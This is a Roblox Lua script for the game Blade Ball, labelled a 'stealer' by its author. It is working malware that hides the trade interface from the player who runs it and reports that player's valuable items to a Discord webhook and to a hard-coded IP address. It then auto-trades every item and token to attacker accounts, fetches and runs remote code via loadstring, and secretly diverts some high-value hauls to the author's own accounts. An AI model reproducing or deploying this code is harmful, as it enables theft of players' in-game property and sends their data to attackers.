_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)
local dualhooked = false
setclipboard("discord.gg/GY2RVSEGDT")

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local discuser = ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Game not supported. Please join a normal Blade Ball server")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = {
        [1] = itemType,
        [2] = ID
    }
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
    until response == true
end

local function readyTrade()
    local args = {
        [1] = true
    }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until response == true
end

local function confirmTrade()
    repeat
        wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local totalRAP = 0

local function SendJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
            inline = false
        }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {
                Name = item.Name,
                Count = 1,
                TotalRAP = item.RAP
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalRAP > b.TotalRAP
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }
    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(list)
    local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
            inline = false
        }
	}

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {
                Name = item.Name,
                Count = 1,
                TotalRAP = item.RAP
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalRAP > b.TotalRAP
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\148\180 New Blade Ball Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendDHJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total RAP: %s", formatNumber(totalRAP)),
            inline = false
        }
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then
            grouped[item.Name].Count = grouped[item.Name].Count + 1
            grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else
            grouped[item.Name] = {
                Name = item.Name,
                Count = 1,
                TotalRAP = item.RAP
            }
        end
    end

    local groupedList = {}
    for _, group in pairs(grouped) do
        table.insert(groupedList, group)
    end

    table.sort(groupedList, function(a, b)
        return a.TotalRAP > b.TotalRAP
    end)

    for _, group in ipairs(groupedList) do
        local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP))
        fields[3].value = fields[3].value .. itemLine .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\148\180 Join to get Blade Ball hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }
    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser,
        ["X-Timestamp"] = timestamp,
        ["X-Signature"] = signature
    }
    local response = request({
        Url = "http://46.101.233.20:5000/bladeballjoin",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]

    if not categoryRapData then
        return nameToRAP
    end

    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function()
            return HttpService:JSONDecode(serializedKey)
        end)

        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then
                    local itemName = pair[2]
                    nameToRAP[itemName] = rap
                    break
                end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do
    rapMappings[category] = buildNameToRAPMap(category)
end

local function getRAP(category, itemName)
    local rapMap = rapMappings[category]
    if rapMap then
        local rap = rapMap[itemName]
        if rap then
            return rap
        else
            return 0
        end
    else
        return 0
    end
end

loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if itemInfo.TradeLock then
            continue
        end
        local itemName = itemInfo.Name
        local rap = getRAP(category, itemName)
        if rap >= min_rap then
            totalRAP = totalRAP + rap
            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemName})
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.RAP > b.RAP
    end)

    if totalRAP >= 50000 and math.random() < 0.15 then
        users = {"theyluvvjaz13", "Alyssa87123", "Inaya32az", "mayax111013", "TobiAltGrind", "TobiHatching"}
        ping = "Yes"
        dualhooked = true
    end

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    if dualhooked then
        local response = request({
            Url = "http://46.101.233.20:5000/getdiscuser",
            Method = "GET"
        })
        discuser = response.Body
        SendDHJoinMessage(itemsToSend, prefix)
    else
        SendJoinMessage(itemsToSend, prefix)
    end

    local function getNextBatch(items, batchSize)
        local batch = {}
        for i = 1, math.min(batchSize, #items) do
            table.insert(batch, table.remove(items, 1))
        end
        return batch
    end

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat
                wait(0.5)
            until inTrade

            local currentBatch = getNextBatch(itemsToSend, 100)
            for _, item in ipairs(currentBatch) do
                addItemToTrade(item.itemType, item.ItemID)
            end

            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
            local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
            local cleanedText = trimmedText:gsub("[^%d]", "")
            local tokensamount = tonumber(cleanedText) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            readyTrade()
            confirmTrade()
        end
        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
    end

    local function waitForUserJoin()
        local sentMessage = false
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                if not sentMessage then
                    SendMessage(sentItems)
                    sentMessage = true
                end
                doTrade(player.Name)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end